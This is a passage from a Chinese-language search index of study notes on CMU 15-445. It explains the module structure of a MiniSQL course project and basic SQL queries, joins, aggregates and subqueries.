\u5c31\u662f\u5206\u914d\u4e00\u4e2a\u7a7a\u95f2\u7684page\uff0c\u4e0d\u9700\u8981\u5173\u5fc3\u5176\u7269\u7406\u9875\u53f7\u662f\u591a\u5c11\uff08\u540e\u9762\u6ca1\u6709\u6a21\u5757\u5173\u5fc3\u9875\u7684\u7269\u7406\u4f4d\u7f6e\uff09\uff0c\u53ea\u9700\u7a7a\u95f2\u5373\u53ef</li> <li>deallocate \u5c31\u662f\u5220\u9664\u4e00\u4e2apage\uff0c\u5728bitmap\u4e0a\u505a\u6807\u8bb0\u5373\u53ef</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#buffer-pool-manager","title":"buffer pool manager","text":"<p>\u5b9e\u9645\u4e0a\u57fa\u672c\u4efb\u4f55\u4e0a\u5c42\u7ed3\u6784\u90fd\u4e0d\u76f4\u63a5\u4f7f\u7528diskmanager\uff0c\u800c\u662f\u901a\u8fc7buffer pool manager\u6765\u64cd\u4f5c\u7269\u7406\u7ed3\u6784\uff0c\u76ee\u6807\u662f\u63d0\u9ad8\u6548\u7387\u3002</p> <p>buffer pool manager \u9762\u5bf9\u7684\u60c5\u5f62\u4f9d\u65e7\u662f\u6e05\u6670\u7684\uff0c\u56e0\u4e3a\u5b9e\u9645\u4e0a\u8fd9\u4e24\u4e2a\u7ec4\u4ef6\u90fd\u4e0d\u6d89\u53ca\u4efb\u4f55\u6570\u636e\u7684\u5b58\u50a8\uff0c\u53ea\u662f\u5728\u7ba1\u7406\u4e00\u4e9bpage\u5728\u5185\u5b58\u548c\u78c1\u76d8\u4e0a\u8fdb\u8fdb\u51fa\u51fa\uff0c\u6240\u4ee5\u5176\u5b9e\u6ca1\u4ec0\u4e48\u597d\u8bb2\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#catalog-manager","title":"catalog manager","text":"<p>\u8fd9\u4e2amanager\u624d\u5f00\u59cb\u6d89\u53ca\u6240\u6709\u5bf9\u7528\u6237\u6709\u610f\u4e49\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u5e93\u4e2d\u4e24\u4e2a\u4e24\u4e2a\u4e3b\u8981\u7684\u5bf9\u8c61\uff0ctable\u548cindex\uff0c\u6982\u8981\u7684\u5173\u7cfb\u5927\u6982\u5982\u4e0b</p> <p>schema + row + record -&gt; table -&gt; catalog</p> <p>index -&gt; catalog</p> <p>\u6211\u4eec\u8fd8\u662f\u6765\u770b\u4ee3\u7801\uff0c\u8fd9\u662f<code>catalog manager</code>\u200b\u4e2d\u7684\u6210\u5458\u53d8\u91cf</p> <pre><code> private:\n  [[maybe_unused]] BufferPoolManager *buffer_pool_manager_;\n  [[maybe_unused]] LockManager *lock_manager_;\n  [[maybe_unused]] LogManager *log_manager_;\n  CatalogMeta *catalog_meta_;\n  std::atomic&lt;table_id_t&gt; next_table_id_;\n  std::atomic&lt;index_id_t&gt; next_index_id_;\n  // map for tables\n  std::unordered_map&lt;std::string, table_id_t&gt; table_names_;\n  std::unordered_map&lt;table_id_t, TableInfo *&gt; tables_;\n  // map for indexes: table_name-&gt;index_name-&gt;indexes\n  std::unordered_map&lt;std::string, std::unordered_map&lt;std::string, index_id_t&gt;&gt; index_names_;\n  std::unordered_map&lt;index_id_t, IndexInfo *&gt; indexes_;\n</code></pre> <p>\u867d\u7136\u6211\u4eec\u5bf9\u4e8e<code>IndexInfo</code>\u200b\u548c<code>TableInfo</code>\u200b\u8868\u793a\u4ec0\u4e48\u8fd8\u4e0d\u660e\u767d\uff0c\u4f46\u662f\u5f88\u5bb9\u6613\u80fd\u591f\u53ef\u4ee5\u770b\u51fa\u8fd9\u91cc\u5b58\u50a8\u7684\u4e1c\u897f\u662f\u5728\u5e72\u4ec0\u4e48\uff0c\u5176\u5b9e\u5c31\u662f\u5e2e\u52a9\u6211\u4eec\u80fd\u591f\u5feb\u901f\u901a\u8fc7table\u548cindex\u7684\u540d\u5b57(std::string)\u6765\u627e\u5230\u5bf9\u5e94\u7684table\u548cindex\u3002</p> <p>\u4f46\u662f\u5176\u4e2d\u8fd8\u6709\u4e00\u4e2a\u53d8\u91cf\u7684\u610f\u4e49\u4e0d\u660e\u786e\uff0c\u90a3\u5c31\u662f<code>CatalogMeta *catalog_meta_;</code>\u200b \uff0c\u8ba9\u6211\u4eec\u6765\u770b\u8fd9\u4e2a\u7c7b\u91cc\u5934\u6709\u4ec0\u4e48</p> <pre><code>  static constexpr uint32_t CATALOG_METADATA_MAGIC_NUM = 89849;\n  std::map&lt;table_id_t, page_id_t&gt; table_meta_pages_;\n  std::map&lt;index_id_t, page_id_t&gt; index_meta_pages_;\n</code></pre> <p>\u8fd9\u662f\u6211\u4eec\u7b2c\u4e00\u6b21\u9047\u5230\u5e26\u6709meta\u540d\u79f0\u7684class\uff0c\u4e00\u822c\u8fd9\u79cdclass\u7684\u76ee\u6807\u5c31\u662f\u7528\u6765\u5e8f\u5217\u5316\uff0c\u56e0\u4e3aminisql\u91cc\u9762\u6240\u6709\u7684\u6570\u636e\u6700\u7ec8\u90fd\u8981\u5b58\u5230\u78c1\u76d8\u4e2d\uff0c\u800c\u6307\u9488\u5b58\u5230\u78c1\u76d8\u4e2d\u4f1a\u76f4\u63a5\u5931\u6548\uff0c\u6307\u9488\u5b58\u50a8\u7684\u662f\u5185\u5b58\u7684\u5730\u5740\uff0c\u56e0\u6b64\u5176\u91c7\u7528\u5c06table\u7684id\u548cpage\u7684id\u5b58\u5230\u78c1\u76d8\u4e2d\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#table-and-index","title":"table and index","text":"<p>table</p> <p>\u6211\u4eec\u524d\u6587\u63d0\u5230\uff0cpage\u53ef\u4ee5\u5f88\u7b80\u5355\u7684\u901a\u8fc7\u4e00\u4e2acast\u8f6c\u6362\u6210\u4e00\u4e2a\u53ef\u7406\u89e3\u7684C++\u7684\u7c7b\uff0c\u90a3\u4e48\u6211\u4eec\u6700\u60f3\u505a\u7684\u5176\u5b9e\u662f\u628apage\u8f6c\u6362\u6210\u6211\u4eec\u6570\u636e\u5e93\u91cc\u5e38\u7528\u7684table\u3002\u4f46\u95ee\u9898\u662f\u4e00\u4e2atable\u662f\u4e0d\u5b9a\u957f\u7684\uff0c\u4e00\u4e2atable\u53ef\u4e0d\u4e00\u5b9a\u80fd\u591f\u5b58\u50a8\u5230\u4e00\u4e2apage\u4e2d\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u66f4\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6211\u4eec\u7528\u4e86\u56db\u4e2a\u6570\u636e\u7ed3\u6784\u6765\u8bbe\u8ba1table\u7684\u5b58\u50a8</p> <ul> <li>tableinfo</li> <li>tablemetadata</li> <li>tablepage</li> <li>tableheap</li> </ul> <p>\u5728\u4e0a\u4e00\u8282\u6211\u4eec\u770b\u5230catalog\u7684meta\u662f\u5b58\u50a8\u4e86\u4e00\u4e2apage_id\u5230\u78c1\u76d8\uff0c\u4f46\u662f\u95ee\u9898\u662f\u4e00\u4e2atable\u5f88\u53ef\u80fd\u5bf9\u5e94\u4e0d\u6b62\u4e00\u4e2apage\u3002\u8fd9\u90e8\u5206\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u7b54\u6848\uff0c\u6211\u4eec\u7ed9\u6bcf\u4e2atable\u914d\u7f6e\u4e86\u4e00\u4e2atablemeta\u7684page\uff0c\u8fd9\u4e2apage\u5b58\u50a8\u4e86\u8fd9\u4e2atable\u548c\u5bf9\u5e94\u7684root id\uff0c\u800c\u6240\u6709\u8be5table\u76f8\u5173\u7684page\u90fd\u5f62\u6210\u4e86\u53cc\u5411\u94fe\u8868\u7684\u5173\u7cfb\u3002\u56e0\u6b64\u6211\u4eec\u901a\u8fc7\u5728catalog\u7684meta\u6570\u636e\u4e2d\u5b58\u50a8\u4e00\u4e2apage\u7684id\uff0c\u5c31\u80fd\u627e\u5230\u8fd9\u4e2atable\u5bf9\u5e94\u7684\u6240\u6709\u7684page</p> <p>index</p> <p>index\u90e8\u5206\u4e5f\u53ef\u4ee5\u53c2\u7167table\u7684\u5f62\u5f0f\u7406\u89e3\u3002BP tree\u786e\u5b9e\u662f\u5b9e\u9a8c\u4e2d\u8017\u65f6\u6700\u591a\u7684\u90e8\u5206\uff0c\u4f46\u662f\u5176\u672c\u8eab\u7684\u7ed3\u6784\u662f\u8db3\u591f\u6e05\u6670\u7684\uff0c\u57fa\u672c\u4e0a\u53ea\u9700\u8981\u586b\u51fd\u6570\u5373\u53ef\u3002\u5176\u96be\u5ea6\u4e3b\u8981\u6709\u4e24\u4e2a\u90e8\u5206\u9020\u6210</p> <ul> <li>\u6574\u4f53\u6d89\u53ca\u7684\u6a21\u5757\u8fc7\u591a\uff0c\u5f88\u591a\u51fd\u6570\u4e0d\u8054\u7cfb\u5404\u4e2a\u6a21\u5757\u770b\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u610f\u601d\uff0c\u4e5f\u5c31\u4e0d\u660e\u767d\u600e\u4e48\u5199\uff0c\u4f8b\u5982\u5982\u679c\u4e0d\u77e5\u9053<code>IndexRootsPage</code>\u200b\u662f\u5982\u4f55\u7ec4\u7ec7\u5404\u4e2aindex\u7684\uff0c\u5bf9\u4e8eBP\u6811\u7684\u6784\u9020\u51fd\u6570\u5c31\u5f88\u5bb9\u6613\u5199\u9519\u6216\u8005\u65e0\u4ece\u4e0b\u624b\u3002</li> <li>\u6d4b\u8bd5\u592a\u5c11\uff0c\u7531\u4e8e\u53bb\u672c\u8eab\u4e3b\u4f53\u90e8\u5206\u5c31\u53ea\u6709\u4e00\u4e2a\u6d4b\u8bd5\uff0c\u6211\u4eec\u53ea\u80fd\u5728\u7f16\u5199\u5b8c\u6240\u6709\u4ee3\u7801\u540e\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6b64\u65f6\u5927\u90e8\u5206\u4eba\u5df2\u7ecf\u79ef\u7d2f\u4e86\u96be\u4ee5\u4f30\u91cf\u7684bug\u4e86\uff0c\u56e0\u6b64\u53ca\u5176\u5efa\u8bae\u5728\u7f16\u5199\u8fc7\u7a0b\u4e2d\u9488\u5bf9\u5404\u4e2a\u5c0f\u6a21\u5757\u7f16\u5199\u6d4b\u8bd5\u3002</li> </ul> <p>\u5176\u5b9eBP\u6811\u7684\u90e8\u5206\u4e5f\u503c\u5f97\u4e00\u5199\uff0c\u4f46\u662f\u5176\u6d89\u53ca\u7684\u6a21\u5757\u592a\u591a\uff0c\u6682\u65f6\u6ca1\u6709\u65f6\u95f4\uff0c\u6211\u8fd8\u662f\u5e0c\u671b\u5148\u8f6c\u5411\u5e26\u601d\u8003\u9898\u7684\u4e8b\u52a1\u548c\u5e76\u53d1\u90e8\u5206\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#_3","title":"\u505a\u4e2a\u5c0f\u603b\u7ed3","text":"<p>\u5176\u5b9e\u5728minisql\u4e2d\u8bbe\u8ba1\u4e86\u8fd9\u4e48\u591a\u6a21\u5757\uff0c\u5f52\u6839\u5230\u5e95\u53ef\u4ee5\u5206\u6210\u8fd9\u51e0\u79cd</p> <ul> <li>meta\u7c7b\uff0c\u4f8b\u5982tablemetadata\u90a3\u6837\uff0c\u5b58\u50a8\u4e86\u67d0\u4e2atable\u7684\u4e00\u4e9b\u5143\u6570\u636e</li> <li>page\u7c7b\uff0c\u4f8b\u5982tablepage\u90a3\u6837\uff0c\u4e3a\u6211\u4eec\u5b9e\u9645\u63d0\u4f9b\u4e86\u4f7f\u7528\u78c1\u76d8bit\u6570\u636e\u7684\u7ed3\u6784</li> <li>\u5b9e\u64cd\u7c7b\uff0c\u4f8b\u5982tableheap\u90a3\u6837\uff0c\u4e3a\u6211\u4eec\u5b9e\u9645\u64cd\u4f5c\u6570\u636e\u5e93\u7684\u5185\u5bb9\u63d0\u4f9b\u63a5\u53e3</li> </ul> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/","title":"SQL","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#sql_1","title":"SQL\u7684\u7c7b\u522b","text":"SQL \u6ca1\u6709\u5927\u5c0f\u5199\u533a\u5206 <ul> <li>DDL  \u8868\u7684\u5b9a\u4e49\u548c\u5b9a\u4e49\u7684\u4fee\u6539\uff0c\u6570\u636e\u5b8c\u6574\u6027\u7684\u8bbe\u7f6e create, alter, drop</li> <li>DML \u8868\u5185\u6570\u636e\u7684\u589e\u5220\u67e5\u6539 select, insert</li> <li>DCL  \u6570\u636e\u63a7\u5236\uff0c\u6570\u636e\u6743\u9650\u7684\u4fee\u6539 Grant, revoke</li> </ul> <p>\u6570\u636e\u7c7b\u578b\u7684\u521b\u5efa</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#ddl","title":"DDL","text":"<p>\u521b\u5efa\u89c6\u56fe*</p> <p>\u89c6\u56fe\u7684\u64cd\u4f5c\uff0c\u4e0e\u539f\u8868\u7684\u5b8c\u6574\u6027\u7ea6\u675f\u95ee\u9898</p> <p>\u5efa\u7acbschema\uff0ctable\uff0cview and index</p> <p>drop\u7684\u540c\u65f6\u53ef\u4ee5\u9009\u62e9 restrict\u6a21\u5f0f\u548ccascade\u6a21\u5f0f\uff0c\u4e5f\u5c31\u662f\u9650\u5236\u5220\u9664\u548c\u5f3a\u5236\u7ea7\u8054\u5220\u9664</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#dml","title":"DML","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#basic-query","title":"basic query","text":"<p>\u8fd9\u90e8\u5206\u4e3b\u8981\u5904\u7406\u662f\u7b5b\u9009\u7684\u9700\u6c42</p> <p>the fundamental SQL query</p> <pre><code>SELECT &lt;columns&gt;\nFROM &lt;table&gt;;\n</code></pre> <p>\u9009\u62e9\u54ea\u4e2a\u8868\uff08table\uff09,\u9009\u62e9\u8fd9\u4e2a\u8868\u91cc\u7684\u54ea\u4e9battributes,(columns)  \u5e76\u4e14\u5168\u90e8\u8f93\u51fa\uff0cfrom\u91cc\u9762\u6709\u591a\u4e2a\u8868\uff0c\u610f\u5473\u8fd9\u4e2a\u8868\u4e4b\u95f4\u9700\u8981\u505a\u7b1b\u5361\u5c14\u79ef</p> <p>select\u5185\u90e8\u53ef\u4ee5\u505a\u64cd\u4f5c\uff0c\u6bd4\u5982\u7ed9\u6240\u6709\u8f93\u51fax10</p> <p>\u5982\u679c\u4f7f\u7528SELECT DISTINCT\uff0c\u4f1a\u5728\u8f93\u51fa\u4e2d\u5220\u9664\u91cd\u590d\u7684\u90e8\u5206\u3002</p> <p>tips\uff1a\u5728\u4e0d\u52a0\u8bf4\u660e\u7684\u60c5\u51b5\u4e0b\uff0c\u8f93\u51fa\u8868\u7684\u5185\u5bb9\u662funorder\u7684</p> <p>\u5bf9\u4e8eselect\u53ef\u4ee5\u4fee\u9970 distinct \u53bb\u91cd\u590d</p> <p>where</p> <pre><code>SELECT name , num_dogs  \u7b2c\u4e09\u4e2a\u6267\u884c\nFROM Person             \u7b2c\u4e00\u4e2a\u6267\u884c\nWHERE age &gt;= 18;        \u7b2c\u4e8c\u4e2a\u6267\u884c\n</code></pre> <p>\u4e0a\u8ff0\u662f\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\uff0c\u5f88\u591a\u65f6\u5019\u6211\u4eec\u53ea\u5173\u6ce8table\u91cc\u9762\u7684\u51e0\u884c\u5185\u5bb9\uff0c\u56e0\u6b64\u6709WHERE\u5173\u952e\u8bcd\uff0c\u540e\u9762\u52a0\u4e0a\u7684\u4e00\u4e2a\u6761\u4ef6\u5224\u65ad\u7b26\u3002</p> <p>tips\uff1aSQL\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\uff0c\u662f\u6309\u7167\u987a\u5e8f\u6267\u884c\uff0c\u4f46\u662fSELECT\u8bed\u53e5\u662f\u6700\u540e\u6267\u884c\u7684</p> <p>\u5bf9\u4e0a\u8ff0\u4ee3\u7801\u5c31\u662f\uff0c\u5148\u627e\u5230Person\u8fd9\u4e2a\u8868\uff0c\u518d\u627e\u5230age\u8fd9\u4e2a\u5c5e\u6027\u5927\u4e8e18\u7684\u884c\uff0c\u518d\u8f93\u51fa\u8fd9\u4e9b\u884c\u7684name\u548cnum_dog\u5217</p> <pre><code>where (A,B) = (1,2)  \u66f4\u52a0\u7b80\u5355\u7684\u5199\u6cd5\n</code></pre> <p>Tips: \u5728\u7b5b\u9009\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u5b58\u5728\u4e00\u4e9b\u65b9\u5f0f\uff0c\u4f7f\u7528%\uff0c_ \u7b49\u7279\u6b8a\u5b57\u7b26\uff0c\u53ef\u4ee5\u505a\u6a21\u7cca\u67e5\u8be2</p> <p>boolean operators</p> <p>SQL\u6709\u57fa\u7840\u7684AND  NOT   OR\u4e09\u4e2a\u5e03\u5c14\u903b\u8f91\u7b26\u53f7\uff0c\u6765\u94fe\u63a5WHERE\u5185\u90e8\u7684\u903b\u8f91\u5173\u7cfb</p> <pre><code>...\nWHERE  age&gt;=11\n    AND num_dog&gt;2;\n</code></pre> <p>Tips: SQL\u91cc\u9762\u7684NULL\u5728\u505a\u903b\u8f91\u64cd\u4f5c\u65f6\u9700\u8981\u7279\u6b8a\u8003\u8651\uff0c\u5982\u4e0b\u56fe</p> <p>\u200b\u200b</p> <ul> <li>var is null</li> <li>var is not null</li> </ul> <p>aggregate functions</p> <p>\u8fd9\u4e9b\u51fd\u6570\u7528\u6765\u5904\u7406\u6574\u4e2acolumn\uff0c\u505a\u4e00\u4e9b\u7edf\u8ba1\u5de5\u4f5c\uff0c\u4e00\u822c\u4f1a\u8fd4\u56de\u4e00\u4e2avalue\uff08\u5176\u5b9e\u672c\u8d28\u4e0a\u662f\u4e00\u884c\u4e00\u5217\u7684\u8868\uff1f\uff09\uff0c\u5176\u5728\u5904\u7406\u7684\u65f6\u5019\u4f1a\u8df3\u8fc7NULL\u503c\uff0c\u4f46\u662f\u5728COUNT\uff08*\uff09\u65f6\u4e0d\u4f1a\u8df3\u8fc7</p> <p>\u57fa\u7840\u7684aggregate function\u6709\u4ee5\u4e0b\u51e0\u4e2a</p> <pre><code>SUM(age) is 72.0, and SUM(num dogs) is 10.0.\nAVG(age) is 18.0, and AVG(num dogs) is 3.3333333333333333.\nMAX(age) is 27, and MAX(num dogs) is 4.\nMIN(age) is 7, and MIN(num dogs) is 3.\nCOUNT(age) is 4, COUNT(num dogs) is 3, and COUNT(*) is 4\n</code></pre> <p>\u4e0a\u8ff0\u51fd\u6570\u4e00\u822c\u5728SELECT\u9009\u62e9column\u7684\u65f6\u5019\u8c03\u7528\uff0c\u9ed8\u8ba4\u60c5\u5f62\u4e0b\u662fall\uff0c\u5fc5\u8981\u65f6\u53ef\u4ee5\u52a0distinct</p> <pre><code>select count(distinct ID)\n</code></pre> <p>\u200b\u200b</p> <p>\u8981\u6ce8\u610f\u7684\u662f\uff0c\u805a\u5408\u51fd\u6570\u4e0d\u53ef\u76f4\u63a5\u7528\u4e8ewhere\u8bed\u53e5\u4e2d\uff0c\u53ea\u53ef\u4ee5\u7528\u4e8eselect\u548chaving</p> <p>GROUP BY \u548c HAVING</p> <pre><code>GROUP BY &lt;columns&gt;\nHAVE \u6761\u4ef6\u8bed\u53e5\n</code></pre> <p>GROUP BY\u7684\u610f\u601d\u662f\u628a\u5217\u8868\u6309\u7167\u4e00\u4e2a\u5217\u5206\u7ec4\uff08\u628a\u8fd9\u4e2a\u7ec4\u7684\u76f8\u540cvalue\u5206\u4e3a\u540c\u4e00\u4e2a\u7ec4\uff09\uff0c\u5176\u6700\u7ec8\u7684\u7ed3\u679c\u53ef\u4ee5\u4fc3\u4f7faggregate function\u7684\u8f93\u51fa\u4e0d\u518d\u662f\u4e00\u4e2a\u4e00\u884c\u4e00\u5217\u7684table\u3002GROUP BY age\u5176\u6548\u679c\u5982\u4e0b\u56fe</p> <p>GROUP BY\u548caggregate function\u7ecf\u5e38\u653e\u5728\u4e00\u8d77\u4f7f\u7528</p> <p>\u200b-----&gt;\u200b</p> <p>\u5176\u4e2d\u7684HAVE\u8bed\u53e5\u5c31\u662f\u5bf9\u5206\u51fa\u6765\u7684\u5404\u4e2aGROUP\u505a\u7b5b\u9009\uff0c\u4f8b\u5982COUNT(*) &gt; 1 \u6700\u540e\u4e00\u4e2aGROUP\u5c31\u4f1a\u88ab\u7b5b\u6389</p> <ul> <li>WHERE \u4f5c\u7528\u4e0eGROUP BY\u4e4b\u524d</li> <li>HAVING \u4f5c\u7528\u4e8e\u4e4b\u540e</li> </ul> <pre><code>SELECT age , AVG( num dogs )    5\nFROM Person                     1\nWHERE age &gt;= 18                 2\nGROUP BY age                    3\nHAVING COUNT( \u2217 ) &gt; 1 ;         4\n</code></pre> <p>ORDER BY</p> <p>\u5bf9\u4e8e\u5176\u8fdb\u884c\u6392\u5e8f\u7684\u505a\u6cd5\uff0c\u5728\u672b\u5c3e\u8fdb\u884cASC\u6216\u8005DESC\uff0c\u9ed8\u8ba4\u662fASC</p> <p>AS</p> <p>\u662f\u5bf9\u4e8e\u6570\u636e\u8868\u505a\u91cd\u547d\u540d\u7684\u64cd\u4f5c\uff0c\u5f53\u6211\u4eec\u9700\u8981\u628a\u4e00\u4e2a\u8868\u81ea\u5df1\u548c\u81ea\u5df1\u505a\u7b1b\u5361\u5c14\u79ef\u7684\u65f6\u5019\uff0c\u9700\u8981\u505a\u91cd\u547d\u540d\uff0c\u6ce8\u610f\u4ee5\u4e0b\u7684\u6267\u884c\u987a\u5e8f\uff0c\u8be5\u91cd\u547d\u540d\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u5747\u751f\u6548\uff0c\u5305\u62ec\u5d4c\u5957\u5b50\u67e5\u8be2\u4e2d</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#join","title":"join","text":"<ul> <li>on \u548c where\u4ec0\u4e48\u65f6\u5019\u76f8\u540c</li> </ul> <p>\u6211\u4eec\u65f6\u5e38\u9700\u8981\u628a\u591a\u4e2a\u8868\u683c\u8054\u52a8\u8d77\u6765\u4e00\u8d77\u5206\u6790\uff0c\u4f8b\u5982</p> <pre><code>SELECT *\nFROM courses, enrollment   \u5355\u7eaf\u7684\u2018,\u2019\u5c31\u662f\u505a\u7b1b\u5361\u5c14\u79ef\nWHERE num = c_num;\n</code></pre> <p>\u5982\u679c\u4e0d\u52a0WHERE\u8bed\u53e5\u7684\u8bdd\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u4f1a\u76f4\u63a5\u628a\u4e24\u4e2a\u8868\u7684row\u505a\u7b1b\u5361\u5c14\u79ef\uff0c\u8fd9\u5f80\u5f80\u4e0d\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u4e9b\u9650\u5236\u6761\u4ef6</p> <pre><code>select *\nfrom courses natural join enrollment\n</code></pre> <p>\u8fd9\u4e2a\u505a\u6cd5\u548c\u524d\u9762\u7684\u4ee3\u7801\u770b\u4f3c\u76f8\u540c\uff0c\u4f46\u662f\u524d\u9762\u90a3\u4e2a\u4f1a\u628a\u76f8\u540c\u540d\u79f0\u7684\u5c5e\u6027\u5206\u4e24\u4e2a\u5c55\u73b0\u51fa\u6765\uff0c\u800cnatural join\u4f1a\u5408\u5e76\u8fd9\u4e24\u4e2a\u5c5e\u6027\u5217</p> <p>join\u4e5f\u6709\u591a\u79cd\u5f62\u5f0f\uff0c\u4e0a\u8ff0\u7684\u5f62\u5f0f\u662f\u6700\u76f4\u63a5\u7684</p> <ul> <li>cross join \u9ed8\u8ba4\u7684\u5f62\u5f0f\uff0c\u5c31\u662f\u4e0a\u8ff0\u60c5\u51b5\uff0c\u53ea\u751f\u6210\u5339\u914d\u6761\u4ef6\u7684table</li> <li>inner join \u5fc5\u987b\u662fA\u4e2d\u6709\uff0cB\u4e2d\u4e5f\u6709</li> <li>outer join \u4ee5\u4e00\u4e2a\u8868\u4e3a\u4e3b\u4f53\uff0c\u5982\u679c\u53e6\u4e00\u4e2atable\u6ca1\u6709\u5339\u914d\u7684\u8bdd\uff0c\u5c31\u751f\u6210NULL</li> <li>natural join  \u5bf9\u4e8e\u4e24\u4e2a\u8868\u4e2d\u5b58\u5728\u7684\u76f8\u540c\u540d\u79f0\u7684\u5c5e\u6027\u505ajoin\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u4f46\u5e76\u4e0d\u5e38\u7528\uff0c\u53ea\u6709natural join\u548c\u4f7f\u7528using\u7684\u60c5\u51b5\u4f1a\u628a\u8868\u7684\u91cd\u590d\u5c5e\u6027\u7ed9\u91cd\u5408\u6389</li> <li>\u666e\u901a\u7684join\u76f8\u5f53\u4e8e\u7b1b\u5361\u5c14\u79ef\uff0c<code>table1 join table2</code>\u200b \u76f8\u5f53\u4e8e <code>table1, table2</code>\u200b</li> </ul> <p>\u591a\u91cd\u7684natural join\u662f\u6309\u7167\u5de6\u5230\u53f3\u987a\u5e8f\u6267\u884c</p> <p>using\u5173\u952e\u8bcd</p> <p>\u4f7f\u7528using(\u5c5e\u6027\u540d)\u53ef\u4ee5\u6307\u51fa\u4e24\u4e2a\u8981\u505ajoin\u7684\u8868\uff0c\u54ea\u4e2a\u5c5e\u6027\u9700\u8981\u76f8\u540c</p> <p>on</p> <p>\u800c\u66f4\u5e38\u7528\u7684\u662f\u53ef\u4ee5\u7528on\u5173\u952e\u8bcd\uff0c\u89c1\u4e0b\u6587\u7684\u4f8b\u5b50</p> <p>outer join</p> <p>\u786e\u4fdd\u5de6\u8868\u7684\u6bcf\u4e00\u884c\u90fd\u88ab\u8f93\u51fa\uff0c\u6ca1\u6709\u5339\u914d\u7684\u7528NULL\u8865\u9f50</p> <pre><code>SELECT *\nFROM courses LEFT OUTER JOIN enrollment\nON num = c_num;\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u9009\u62e9</p> <ul> <li>RIGHT OUTER JOIN \u786e\u4fdd\u53f3\u8868\u7684\u6bcf\u4e00\u884c\u90fd\u88ab\u8f93\u51fa</li> <li>FULL OUTER JOIN \u4e24\u4e2a\u8868\u7684\u6bcf\u4e00\u884c\u90fd\u8981\u88ab\u8f93\u51fa</li> </ul> <p>tips\uff1a\u6211\u4eec\u6700\u597d\u5728\u4f7f\u7528\u5c5e\u6027\u7684\u65f6\u5019\uff0c\u7528table.attribute\u6765\u9650\u5b9a\u8303\u56f4\uff0c\u4f8b\u5982 courses.num = enrollment.c_num</p> <p>\u540c\u65f6\u6211\u4eec\u8fd8\u6709\u4e00\u4e2a\u8bed\u6cd5\u7cd6\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u5f15\u5165\u8868\u7684\u65f6\u5019 \u52a0\u4e0aAS \u6765\u5728\u672c\u6b21\u8bed\u53e5\u5c06\u5176\u91cd\u547d\u540d\uff0c\u4ee5\u4fbf\u4f7f\u7528\u8d77\u6765\u66f4\u65b9\u4fbf</p> <pre><code>SELECT *\nFROM courses AS c LEFT OUTER JOIN enrollment AS e\nON c.num = e.c_num;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#_1","title":"\u96c6\u5408\u64cd\u4f5c","text":"<ul> <li>union</li> <li>except  \u5220\u9664\u96c6\u5408\u4e2d\u7684\u53cd\u4f8b\uff0c\u4ee3\u8868\u5173\u7cfb\u4ee3\u6570\u4e2d\u7684\u201c-\u201d   \u5728\u53d6\u53cd\u64cd\u4f5c\u4e2d\u5f88\u5e38\u89c1</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#subqueries","title":"subqueries","text":"<p>\u5d4c\u5957\u7684\u67e5\u8be2\u4f7f\u5f97SQL\u7684\u529f\u80fd\u66f4\u52a0\u7684\u5b8c\u6574</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728\u6761\u4ef6\u8bed\u53e5\u548cFROM\u8bed\u53e5\u52a0\u5165subqueries</p> <pre><code>SELECT num\nFROM enrollment;\nWHERE students &gt;= (\n    SELECT AVG(students)\n    FROM enrollment;\n);\n</code></pre> 